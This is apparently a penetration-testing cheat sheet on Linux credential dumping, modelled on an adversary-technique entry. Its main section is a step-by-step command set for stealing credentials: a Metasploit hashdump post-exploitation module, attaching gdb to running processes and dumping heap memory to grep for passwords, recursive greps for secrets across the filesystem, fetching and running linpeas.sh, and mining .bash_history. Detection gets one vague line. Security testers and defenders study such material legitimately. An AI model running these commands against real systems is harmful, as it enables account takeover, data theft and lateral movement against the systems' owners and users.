# Password Dumping

## **Exploit Description:**

Adversaries may attempt to dump credentials to obtain account login and credential material, normally in the form of a hash or a clear text password, from the operating system and software. Credentials can then be used to perform Lateral Movement and access restricted information.

Several of the tools mentioned in associated sub-techniques may be used by both adversaries and professional security testers. Additional custom tools likely exist as well.

## Command Syntax
```

-[Password Hashes]-

Need shell via meterpreter on box

meterpreter > use post/linux/gather/hashdump
meterpreter > show options
meterpreter > set SESSION session-id
meterpreter > exploit

-[Plaintext]-

If trying to grab plaintext passwords from a linux system, it is possible to obtain them via GDB/GNU debugger.  Need foothold in system.

1. find services in operation that need authentication/have been previously authenticated through

ps -ef

IE, you find -bash, running under the current terminal with the pid of 3839

You may also search for a specific service with 

ps -eg | grep '<SERVICE NAME>'

2. Use gdb to dump its memory to determine any previous usage of credentials

gdb -p <PID>

This will open a shell where you can now enter gdb commands.

3. List all mapped memory regions inside gdb shell

info proc mappings

Take note of the start address and end address of the listed heap

4. Dump memory of the start and end address of the heap allocation into a file for analysis

dump memory <OUTPUT_FILE> <START_ADDRESS> <END_ADDRESS>

5. use strings to identify potentially useful credentials via passw keyword

strings <OUTPUT_FILE> | grep passw

-[Configuration Files]-

1. Grep for files that may contain passwords

grep --color=auto -rnw '/' -ie "Password" --color=always 2>/dev/null

— color will color code the results accordingly

-rnw means recursive search, print line number, match only whole words

‘/’ means start search from root directory

-ie means ignore case, and use patterns for matching.

Can also query for these keywords in lieu of "Password" - passwd, pass, passw, key, secret

grep --color=auto -rnw '/etc' -ie "Password" --color=always 2>/dev/null

Would query /etc for instance

grep --color=auto -rnw '/home/user' -ie "Password" --color=always 2>/dev/null 

Would query the /home directory

find /etc -type f -exec grep -i -I "pass" {} /dev/null \;

Would list files that contain the pass keyword

find '/home/user' -type f -exec grep -i -I "pass" {} /dev/null \;

2. Download linpeas utility

Use wget, curl, or a simple http server to pull down linpeas.sh

chmod +x linpeas.sh

./linpeas.sh

-[History Files]-

cat /home/user/.bash_history | grep "pass"

The .bash_history file only stores the history of a specific user.

Alt,

history

Will show all commands run on terminal

```

## Detection Techniques
```

Kibana, looking on the box, etc

```